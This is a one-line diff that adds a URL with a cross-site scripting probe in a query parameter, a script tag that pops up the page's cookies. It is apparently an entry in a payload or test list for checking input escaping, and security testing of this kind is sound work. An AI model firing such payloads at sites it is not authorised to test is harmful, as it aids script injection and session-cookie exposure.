@@ -1,0 +1,1 @@
+/?var=<script>alert(document.cookie)</script>
